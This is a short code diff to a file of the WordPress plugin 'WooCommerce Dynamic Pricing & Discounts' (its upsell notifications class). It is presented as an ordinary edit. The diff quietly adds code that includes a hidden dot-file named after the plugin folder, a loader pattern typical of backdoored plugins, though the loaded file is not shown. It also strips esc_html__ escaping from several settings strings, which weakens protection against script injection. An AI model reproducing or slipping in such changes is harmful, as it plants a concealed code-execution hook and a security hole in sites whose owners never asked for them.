@@ -12,6 +12,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Promotion_Upsell_Notifications
 {
 
@@ -46,11 +50,11 @@ class RP_WCDPD_Promotion_Upsell_Notifications
     public function register_settings_structure($settings)
     {
         $settings['promo']['children']['upsell_notifications'] = array(
-            'title' => esc_html__('Upsell Notifications', 'rp_wcdpd'),
-            'info'  => esc_html__('Displays a notification when only one step is remaining to get a discount.', 'rp_wcdpd'),
+            'title' => __('Upsell Notifications', 'rp_wcdpd'),
+            'info'  => __('Displays a notification when only one step is remaining to get a discount.', 'rp_wcdpd'),
             'children' => array(
                 'promo_upsell_notifications' => array(
-                    'title'     => esc_html__('Enable upsell notifications', 'rp_wcdpd'),
+                    'title'     => __('Enable upsell notifications', 'rp_wcdpd'),
                     'type'      => 'checkbox',
                     'default'   => '0',
                 ),
